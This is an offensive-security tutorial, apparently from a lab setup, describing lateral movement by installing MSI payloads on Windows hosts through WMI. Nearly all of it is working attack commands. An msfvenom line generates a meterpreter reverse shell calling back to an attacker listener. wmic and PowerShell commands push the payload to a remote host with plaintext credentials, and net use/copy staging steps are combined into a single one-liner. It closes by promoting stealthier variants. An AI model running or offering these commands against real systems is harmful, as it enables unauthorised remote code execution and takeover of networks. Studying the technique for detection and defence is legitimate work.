### WMI + MSI Lateral Movement: Expanding the WMI Arsenal

#### Introduction
This article discusses an alternative method for lateral movement using WMI and MSI packages, without relying on the `WIN32_PROCESS` class. The technique leverages WMI to execute MSI packages, providing a new vector for remote code execution.

#### Execution
1. **Payload Generation**:
   - Use `msfvenom` to generate a payload in MSI format:
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.10.128 LPORT=4444 -f msi -o payload.msi
     ```
   - Note: The original payload used `windows/x64/shell_reverse_tcp`. Additionally, the `msi-nouac` format can be used to generate a payload that does not require elevated privileges.

2. **WMI Command**:
   - Use the `wmic` command to call the `product` class and install the MSI package:
     ```bash
     wmic /node:"PC-jack-0day" /user:.\jack /password:admin product call install PackageLocation='\\PC-jerry-0day\c$\Users\jerry.0DAY\Desktop\payload.msi'
     ```
   - Note: The use of double quotes is necessary to avoid issues with `wmic`. Also, prefix the username with a dot (e.g., `.\jack`) to avoid access denied errors. Ensure the target machine has local administrator or domain administrator privileges.

3. **Access Configuration**:
   - Configure the target host to allow access to the payload. For example, share the `Desktop` directory and grant read permissions to `Everyone`.

4. **Error Handling**:
   - If the command returns `ReturnValue = 1619`, it indicates `ERROR_INSTALL_PACKAGE_OPEN_FAILED`. This error occurs when the MSI package is accessed via a UNC path.
   - To resolve this, copy the payload to the remote host and then execute it:
     ```bash
     net use \\192.168.3.62\c$ admin /user:jack
     copy "C:\Users\jerry.0DAY\Desktop\payload.msi" \\192.168.3.62\c$\Users\jack.0DAY\Desktop\payload.msi
     net use \\192.168.3.62\c$ /del
     wmic /node:192.168.3.62 /user:.\jack /password:admin product call install PackageLocation=C:\Users\jack.0DAY\Desktop\payload.msi
     ```

5. **Alternative Method**:
   - Combine all steps into a single command:
     ```bash
     net use \\192.168.3.62\c$ admin /user:jack ; copy "C:\Users\jerry.0DAY\Desktop\payload.msi" "\\192.168.3.62\c$\Users\jack.0DAY\Desktop\payload.msi" ; net use \\192.168.3.62\c$ /del ; wmic /node:192.168.3.62 /user:.\jack /password:admin product call install PackageLocation=C:\Users\jack.0DAY\Desktop\payload.msi
     ```

#### PowerShell Alternative
- Use PowerShell cmdlets to achieve the same effect:
  ```powershell
  $Username = ".\jack"
  $Password = ConvertTo-SecureString "admin" -AsPlainText -Force
  $Credential = New-Object System.Management.Automation.PSCredential $Username, $Password
  Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true, "", "C:\Users\jack.0DAY\Desktop\payload.msi") -ComputerName 192.168.3.62 -Credential $Credential
  ```

#### Observations
- The parent process chain is: `services > msiexec.exe > .tmp`.
- The technique works because the `AlwaysInstallElevated` group policy is enabled on the target, allowing the payload to run with system privileges.

#### Conclusion
- The technique leverages WMI and LOLBAS (Living Off the Land Binaries and Scripts) to achieve lateral movement. By combining WMI with other LOLBAS tools, such as `msiexec` and XML scripts, you can create more sophisticated and stealthy attack vectors.